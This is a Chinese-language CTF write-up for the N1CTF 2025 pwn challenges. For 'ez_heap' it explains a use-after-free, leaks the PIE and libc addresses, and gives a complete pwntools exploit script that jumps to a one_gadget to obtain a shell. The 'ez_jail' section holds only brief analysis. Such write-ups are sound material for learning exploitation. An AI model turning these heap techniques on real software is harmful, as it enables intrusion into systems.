---
title: N1ctf-2025-pwn
tags:
    - heap
    - pwn
categories:
    - 比赛记录
cover: /img/治不开心药.png
---
# N1ctf-2025-pwn

## 前言
## ez_heap

### 静态分析
struct：
```c
struct my_struct{
__int64 name_size;
__int64 conten_size;
char name[16];
__int64 heap_addr;
__int64 arry_addr;
}
```
其实是用一个大堆块，每0x30 用来保存一个堆块的相关信息。 每次add，会申请新堆块来保存content

![](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250914201234102.png)

在这里发现，可以通过`*a3` 造成一个uaf 漏洞,配合后面`show()`可以泄露出main_arena,那么就拿到了libc.

但是进一步发现，edit和show 都只能使用一次，而且 `*a3` 为0 时,delete 会返回到v7(由用户控制),但是我们没有任何地址信息.

edit的scanf 虽然有溢出漏洞,但是`\x00` 截断的问题还是没有解决.如果可以知道pie ,我们可以覆盖heapaddr 为got 表把libc泄露出来.


等一下,原本这里是堆的地址,我们现在可以计算目标和这里原地址的偏移,同时已知^运算的另一个数,那么我们其实可以计算最后的结果,嘶~~ .那么就可以把pie泄露出来,接下来就是看能不能正常从edit和show里返回了。

### exp

```python
from esy import *
context.log_level="debug"
context.terminal=['tmux','splitw','-h','-l','66%']

libc=ELF("./libc.so.6")

# 一些阻碍
pas=b"admin"+b":"+b"x"+p8(0xc2)+b"xxxxxx"+b":Junior:1234"
keys=b"a"*7
# gdb.attach(io,'''
# b *$rebase(0x1C20)
# b *$rebase(0x1ae4)
# b *$rebase(0x1C0B)
# b *$rebase(0x1952)
# ''')
# onegadgets
'''
0xef52b onegadgets
0xef4ce onegadgets
0x3F60 puts
0x4080 
b *$rebase(0x1D4C)
'''
def key():
    io.sendlineafter("Please enter your key:\n",keys)

def add(name,size,content):
    io.sendlineafter("Please enter your choice.~~",str(1))
    key()
    io.sendafter("name:(size<16)\n",name)
    io.sendlineafter("content size:(size<=0x70)\n",str(size))
    io.sendafter("content:\n",content)

def delete(idx,num):
    io.sendlineafter("Please enter your choice.~~\n",str(2))
    key()
    io.sendlineafter("index:\n",str(idx))
    io.sendlineafter("numbers:\n",num)

def show(idx):
    io.sendlineafter("Please enter your choice.~~\n",str(3))
    key()
    io.sendlineafter("index:\n",str(idx))

def edit(idx,name):
    io.sendlineafter("Please enter your choice.~~\n",str(4))
    key()
    io.sendlineafter("index:\n",str(idx))
    io.sendlineafter("name:(size<16)\n",name)
one=[0xef52b,0xef4ce]
name=b"a"*0xf
main=0x1CCB
menu=0x1DA1

def pwn():
    io.sendlineafter("Do you want to play a game with me?\n",pas)
    add(name,0x68,b'a\n')
    add(name,0x68,b'b\n')
    add(name,0x68,b'c\n')
    add(name,0x68,b'd\n')
    # leak pie heap
    payload=name+b"\x00"+b"\xba"
    edit(0,payload)
    show(0)
    io.recvuntil("content: ")
    heap=u64(io.recv(6).rjust(8,b"\x00"))
    pie=u64(io.recv(6).ljust(8,b"\x00"))-0x4080
    logv("pie",hex(pie))
    logv("heap",hex(heap))
    delete(1,str(pie+main).encode())
    # count & leak libc

    puts_got=elf.got["puts"]+pie
    puts_encode=puts_got ^ 0x787878787878c278
    payload=name+b"\x00"+p64(puts_encode)
    io.sendlineafter("Do you want to play a game with me?\n",pas)
    edit(2,payload)
    show(2)
    io.recvuntil("content: ")
    puts=u64(io.recv(6).ljust(8,b"\x00"))
    libc_base=puts-libc.sym["puts"]
    logv("puts",hex(puts))
    logv("libc_base",hex(libc_base))
    getshell=libc_base+one[0]
    delete(1,str(getshell).encode())
    
    
while True:
    try:
        io,elf=loadfile("./heap","",0)
        pwn()
        io.interactive()
    except:
        io.close()



```

## ez_jail

## 静态分析

![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250920223356355.png)

uaf可以配合`show`,泄露main_arena 信息来泄露libc ,但是要如何利用呢?

